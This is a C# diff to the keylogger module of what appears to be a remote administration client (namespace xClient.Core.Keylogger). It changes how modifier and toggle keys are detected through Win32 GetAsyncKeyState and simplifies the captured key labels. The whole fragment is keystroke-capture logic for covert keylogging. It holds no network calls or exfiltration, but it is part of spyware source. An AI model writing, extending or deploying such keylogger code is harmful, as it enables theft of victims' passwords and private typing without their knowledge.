@@ -56,19 +56,27 @@ namespace xClient.Core.Keylogger
             {
                 // Modifier keys that are pressed:
                 CtrlKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_CONTROL).IsKeyPressed(),
+                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_CONTROL).IsKeyPressed() ||
+                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_LCONTROL).IsKeyPressed() ||
+                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_RCONTROL).IsKeyPressed(),
                 AltKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_MENU).IsKeyPressed(),
+                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_MENU).IsKeyPressed() ||
+                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_LMENU).IsKeyPressed() ||
+                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_RMENU).IsKeyPressed(),
                 ShiftKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_SHIFT).IsKeyPressed(),
+                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_SHIFT).IsKeyPressed() ||
+                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_LSHIFT).IsKeyPressed() ||
+                    //Win32.GetAsyncKeyState(KeyloggerKeys.VK_RSHIFT).IsKeyPressed(),
                 // Modifier keys that have a state (toggle 'on' or 'off').
-                CapsLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_CAPITAL).IsKeyToggled(),
-                NumLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_NUMLOCK).IsKeyToggled(),
-                ScrollLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_SCROLL).IsKeyToggled()
+                CapsLock = KeyloggerHelpers.CapsLockToggled(),
+                NumLock = KeyloggerHelpers.NumLockToggled(),
+                ScrollLock = KeyloggerHelpers.ScrollLockToggled()
             };
 
             // To avoid having to repeatedly check if one of the modifier
             // keys (besides shift and caps lock) was set, just simply
             // decide and then store it right here.
-            ModifierKeysSet = (ModifierKeys.CtrlKeyPressed || ModifierKeys.AltKeyPressed ||
-                               ModifierKeys.NumLock        || ModifierKeys.ScrollLock);
+            ModifierKeysSet = (ModifierKeys.CtrlKeyPressed || ModifierKeys.AltKeyPressed);
         }
     }
 
@@ -178,7 +186,7 @@ namespace xClient.Core.Keylogger
         /// <summary>
         /// SPACEBAR key.
         /// </summary>
-        [KeyloggerKey("SPACE", true)]
+        [KeyloggerKey(" ")]
         VK_SPACE = 0x20,
 
         /// <summary>
@@ -793,37 +801,37 @@ namespace xClient.Core.Keylogger
         /// <summary>
         /// Left SHIFT key.
         /// </summary>
-        [KeyloggerKey("LSHIFT", true)]
+        [KeyloggerKey("SHIFT", true)]
         VK_LSHIFT = 0xA0,
 
         /// <summary>
         /// Right SHIFT key.
         /// </summary>
-        [KeyloggerKey("RSHIFT", true)]
+        [KeyloggerKey("SHIFT", true)]
         VK_RSHIFT = 0xA1,
 
         /// <summary>
         /// Left CONTROL (CTRL) key.
         /// </summary>
-        [KeyloggerKey("LCTRL", true)]
+        [KeyloggerKey("CTRL", true)]
         VK_LCONTROL = 0xA2,
 
         /// <summary>
         /// Right CONTROL (CTRL) key.
         /// </summary>
-        [KeyloggerKey("RCTRL", true)]
+        [KeyloggerKey("CTRL", true)]
         VK_RCONTROL = 0xA3,
 
         /// <summary>
         /// Left MENU key.
         /// </summary>
-        [KeyloggerKey("LALT", true)]
+        [KeyloggerKey("ALT", true)]
         VK_LMENU = 0xA4,
 
         /// <summary>
         /// Right MENU key.
         /// </summary>
-        [KeyloggerKey("RALT", true)]
+        [KeyloggerKey("ALT", true)]
         VK_RMENU = 0xA5,
 
         /// <summary>
